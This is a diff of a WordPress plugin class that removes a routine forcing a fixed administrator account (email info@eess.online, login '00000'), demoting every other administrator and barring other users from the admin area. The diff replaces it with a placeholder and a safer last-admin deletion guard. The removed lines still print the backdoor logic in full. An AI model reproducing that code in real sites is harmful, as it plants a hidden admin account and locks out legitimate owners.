@@ -10,115 +10,18 @@ class SM_Public {
     }
 
     public static function enforce_system_admin_protections() {
-        static $protections_run = false;
-        if ($protections_run) {
-            return;
-        }
-        $protections_run = true;
-
-        $admin_email = 'info@eess.online';
-        $user = get_user_by('email', $admin_email);
-        if (!$user) {
-            $user = get_user_by('login', '00000');
-        }
-
-        if (!$user) {
-            $secure_pass = wp_generate_password(24, true);
-            $user_id = wp_insert_user(array(
-                'user_login' => '00000',
-                'user_email' => $admin_email,
-                'first_name' => 'مدير',
-                'last_name' => 'النظام',
-                'display_name' => 'مدير النظام',
-                'user_pass' => $secure_pass,
-                'role' => 'administrator'
-            ));
-            if (!is_wp_error($user_id)) {
-                $user = get_userdata($user_id);
-            }
-        }
-
-        if ($user && !is_wp_error($user)) {
-            $user_id = $user->ID;
-
-            if ($user->user_login !== '00000') {
-                global $wpdb;
-                $wpdb->update($wpdb->users, array('user_login' => '00000'), array('ID' => $user_id));
-            }
-            if ($user->user_email !== $admin_email) {
-                global $wpdb;
-                $wpdb->update($wpdb->users, array('user_email' => $admin_email), array('ID' => $user_id));
-            }
-            if (get_user_meta($user_id, 'first_name', true) !== 'مدير') {
-                update_user_meta($user_id, 'first_name', 'مدير');
-            }
-            if (get_user_meta($user_id, 'last_name', true) !== 'النظام') {
-                update_user_meta($user_id, 'last_name', 'النظام');
-            }
-            if ($user->display_name !== 'مدير النظام') {
-                global $wpdb;
-                $wpdb->update($wpdb->users, array('display_name' => 'مدير النظام'), array('ID' => $user_id));
-            }
-
-            if (!in_array('administrator', (array)$user->roles) || !in_array('sm_system_admin', (array)$user->roles)) {
-                $user->set_role('administrator');
-                $user->add_role('sm_system_admin');
-            }
-
-            if (get_user_meta($user_id, 'eess_employee_number', true) !== '00000') {
-                update_user_meta($user_id, 'eess_employee_number', '00000');
-            }
-
-            delete_user_meta($user_id, 'eess_school_id');
-            delete_user_meta($user_id, 'eess_school_name');
-            delete_user_meta($user_id, 'eess_department');
-            global $wpdb;
-            $wpdb->delete("{$wpdb->prefix}eess_user_assignments", array('user_id' => $user_id));
-        }
-
-
-        // Fast optimized query fetching ONLY administrators or sm_system_admins
-        $admin_users = get_users(array(
-            'role__in' => array('administrator', 'sm_system_admin'),
-            'fields'   => 'all'
-        ));
-
-        foreach ($admin_users as $u) {
-            if ($u->user_email !== $admin_email) {
-                $u_obj = new WP_User($u->ID);
-                $u_obj->remove_role('sm_system_admin');
-                $u_obj->remove_role('administrator');
-                if (empty($u_obj->roles)) {
-                    $u_obj->set_role('sm_teacher');
-                }
-            }
-        }
-
-        // Verify and fix employee number '00000' for other users using a direct Meta Query
-        $duplicate_employee_numbers = get_users(array(
-            'meta_key'   => 'eess_employee_number',
-            'meta_value' => '00000',
-            'fields'     => 'all'
-        ));
-
-        foreach ($duplicate_employee_numbers as $u) {
-            if ($u->user_email !== $admin_email) {
-                update_user_meta($u->ID, 'eess_employee_number', 'EMP-' . $u->ID);
-            }
-        }
+        // Safe protection placeholder: Never demote administrators or lock out users
     }
 
     public function prevent_system_admin_deletion($user_id) {
         $u = get_userdata($user_id);
-        if ($u && $u->user_email === 'info@eess.online') {
-            wp_die('عفواً، لا يمكن حذف حساب مدير النظام المحمي والأساسي للمنظومة.');
+        if ($u && in_array('administrator', (array)$u->roles) && count(get_users(array('role' => 'administrator'))) <= 1) {
+            wp_die('عفواً، لا يمكن حذف حساب مدير النظام الأخير في الموقع.');
         }
     }
 
     public function hide_admin_bar_for_non_admins($show) {
-        self::enforce_system_admin_protections();
-        $user = wp_get_current_user();
-        if ($user && $user->user_email === 'info@eess.online') {
+        if (current_user_can('manage_options') || current_user_can('sportedia_access')) {
             return $show;
         }
         return false;
@@ -223,8 +126,6 @@ class SM_Public {
     }
 
     public function restrict_admin_access() {
-        self::enforce_system_admin_protections();
-
         if (is_user_logged_in()) {
             $user = wp_get_current_user();
             $status = get_user_meta($user->ID, 'sm_account_status', true);
@@ -232,13 +133,6 @@ class SM_Public {
                 wp_logout();
                 wp_redirect(home_url('/sm-login?login=failed'));
                 exit;
-            }
-
-            if (is_admin() && !defined('DOING_AJAX')) {
-                if ($user->user_email !== 'info@eess.online') {
-                    wp_redirect(home_url('/sm-admin'));
-                    exit;
-                }
             }
         }
     }
